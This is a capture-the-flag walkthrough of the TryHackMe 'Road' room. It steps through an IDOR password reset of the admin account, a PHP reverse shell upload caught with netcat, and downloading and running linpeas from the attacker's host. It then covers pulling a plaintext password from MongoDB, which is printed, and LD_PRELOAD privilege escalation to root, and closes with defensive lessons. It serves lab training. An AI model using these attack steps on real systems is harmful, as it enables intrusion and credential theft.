# TryHackMe: Road Walkthrough
Room Link: https://tryhackme.com/room/road
Focuses on: IDOR, MongoDB Enumeration, Privilege Escalation via Environment Variables
Note: we can add the machine ip to /etc/hosts and then work-on too!

---

### 1. Reconnaissance - Nmap Scan
```bash
nmap <TARGET_IP> -sC -sV 
```
<img width="765" height="328" alt="image" src="https://github.com/user-attachments/assets/76e3035c-aa4a-4746-97aa-6acf890c73dd" />

---

### 2. Web Enumeration
Navigate to `http://<TARGET_IP>`. It is a travel agency site. 

1.  **Directory Brute-forcing:** Use `gobuster` to find hidden paths.
    ```bash
    gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x html,txt,php,zip
    ```
    <img width="748" height="477" alt="image" src="https://github.com/user-attachments/assets/96f0335b-73bb-4704-8247-7679ea3cd30b" />
    
2.  **Registering an Account:** Click "Registration" and create a dummy account (e.g., `test123@gmail.com`).
3.  **The Dashboard:** Once logged in, you’ll see a user dashboard with a **"Reset User"** and a **"Profile"** section.
    <img width="1918" height="601" alt="image" src="https://github.com/user-attachments/assets/60b4017c-eb13-44b7-bfb4-c89586c2f473" />

---

### 3. Exploitation 

#### **Vulnerability 1: IDOR (Insecure Direct Object Reference)**
It says only admin can upload profile picture in Profile Section. In the "Edit User", got to reset password page.
1.  Open **Burp Suite** and turn on Intercpet and FoxyProxy.
2.  Enter any password like 1234 and save it
3.  **The Request:** Look at the POST request to `/v2/lostpassword.php` and send it to repeater
4.  **The Trick:** Notice the parameter `uname=test123@gmail.com`. Change this value to `admin@sky.thm`.
5.  **Result:** The server returns a 202 success message, where we have update the admin password as 1234.
    <img width="1160" height="518" alt="image" src="https://github.com/user-attachments/assets/91c734d7-e906-4631-9da1-357cdffe5068" />


#### **Vulnerability 2: Unrestricted File Upload (RCE)**
Sign Out and Sign in back using admin credentials. now, we can upload files, we can check if we can upload a web shell.
1.  Download a PHP reverse shell or craft one, i used pentest-monkey php reverse shell.
2.  Edit the file to include **VPN IP** and any port like 1234.
3.  In the Profile Update screen, upload the `.php` shell and click edit profile, and it says saved!
4.  To know where the files get stored, we can vies its source code : `/v2/profileimages/`
5.  **Triggering the Shell:** `http://<MACHINE_IP>/v2/profileimages/phpshell.php`
6.  **Catch the Shell:** we can listen using netcat with the port mentioned in php shell, here 1234
    ```bash
    nc -lvnp 1234
    ```
7.  Once we get a shell, cd to webdeveloper and cat user.txt
    <img width="1187" height="167" alt="image" src="https://github.com/user-attachments/assets/bc277071-84a2-48b4-9d6a-744bd8a585b0" />

---

## ## 4. Lateral Movement (User Pivot)
now, its `www-data`. We need to find credentials for the user `webdeveloper`.
get a shell using `python3-c 'import pty;pty.spawn("/bin/bash")'`

1.  **Enumerate Local Services:** Use linpeas and lookout for active ports, keep python server running in local system from /usr/share/peass/linpeas
    ```bash
    cd /tmp
    wget <vpn_ip>:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    <img width="825" height="354" alt="image" src="https://github.com/user-attachments/assets/fa02b7df-1ed5-454d-a265-103a6d74db10" />

3.  **MongoDB Investigation:** we find mongodb running in 27017
    Connect to the database:
    ```bash
    mongo 127.0.0.1:27017
    > show dbs
    > use backup
    > show collections
    > db.user.find()
    ```
    we get the pass for `webdeveloper` in plaintext
    <img width="849" height="457" alt="image" src="https://github.com/user-attachments/assets/1d64cc37-f604-4928-8e18-a18f28c6e310" />

5.  **SSH Login:**
    ```bash
    ssh webdeveloper@<MACHINE_ip>
    add fingerprints? yes
    enter the password obtained from above: BahamasChapp123!@#
    ```

---

### 5. Privilege Escalation (Root)
Check for custom binaries or sudo permissions.

1.  **Sudo Check:**
    ```bash
    sudo -l
    ```
    <img width="795" height="181" alt="image" src="https://github.com/user-attachments/assets/eb2e0aee-008d-4f98-a80d-f8732452b507" />

2.  **Analyzing the Binary and Injection Attack:**
    The binary runs a backup script. Check the environment variables it uses: **LD_PRELOAD** and **NOPASSWD**
    Search for privilege escalation shells scripts, eg: https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#ld_preload-and-nopasswd
    <img width="797" height="656" alt="image" src="https://github.com/user-attachments/assets/184d0f34-336e-439a-9a93-ab2baa873c1e" />

    ```bash
    nano shell.c 
    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    sudo LD_PRELOAD=/home/webdeveloper/shell.so /usr/bin/sky_backup_utility
    ```

5.  **Victory:**
    ```bash
    whoami
    # root
    cat /root/root.txt
    ```
    <img width="1303" height="159" alt="image" src="https://github.com/user-attachments/assets/72d4cbaa-3201-4cb9-94a7-c817446ed84b" />

---

#### Lessons Learned:
* **Fix IDOR:** Never trust user-supplied identifiers (like `uname`) in a request to update sensitive data. Use session-based authentication to verify the user.
* **Secure File Uploads:** Implement "Magic Byte" checking and rename files upon upload to prevent execution of PHP scripts.
* **Database Security:** Don't store plaintext passwords in backups; use salted hashes
* **Safe Coding:** Always use absolute paths (e.g., `/usr/bin/tar` instead of `tar`) in scripts that will be run with elevated privileges.
* **Secure Sudoers:** Prevent environment hijacking by using env_reset in the sudoers file and ensuring sensitive variables like LD_PRELOAD are not permitted in the env_keep list.
